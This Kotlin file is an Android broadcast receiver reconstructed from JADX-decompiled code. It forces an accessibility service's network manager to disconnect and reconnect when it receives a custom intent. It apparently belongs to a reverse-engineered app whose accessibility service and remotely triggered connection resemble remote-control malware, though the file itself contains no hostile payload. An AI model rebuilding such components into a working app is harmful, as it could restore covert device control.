package com.storm.safe.rock.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.NetworkManager

/**
 * JADX: jrhgpixkephr.java (45 lines) — ForceReconnectReceiver
 * BroadcastReceiver that handles FORCE_RECONNECT intent.
 *
 * On receiving the broadcast:
 * 1. Validates the action is FORCE_RECONNECT
 * 2. Gets NetworkManager instance
 * 3. Calls ensureConnected() + forceReconnect()
 *
 * JADX references:
 * - C0323a8.f53097e0 → NetworkManager singleton holder
 * - lj0Var.m211643a8() → ensureConnected
 * - lj0Var.m211669d6() → forceReconnect / disconnect-reconnect
 */
class jrhgpixkephr : BroadcastReceiver() {

    companion object {
        private const val TAG = "jrhgpixkephr"
        const val ACTION_FORCE_RECONNECT = "com.storm.safe.rock.intent.FORCE_RECONNECT"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action == ACTION_FORCE_RECONNECT) {
            // JADX: C0323a8.f53097e0.getInstance() → NetworkManager singleton
            // Calls ensureConnected() then disconnect-reconnect (m211669d6)
            val nm = MyAccessibilityService.getInstance()?.getNetworkManager()
            if (nm == null) {
                Log.w(TAG, "收到重连广播，NetworkManager 未初始化，忽略")
                return
            }
            nm.ensureConnected()
            nm.disconnect()
            nm.ensureConnected()
            Log.d(TAG, "收到重连广播，已触发 forceReconnect")
        }
    }
}
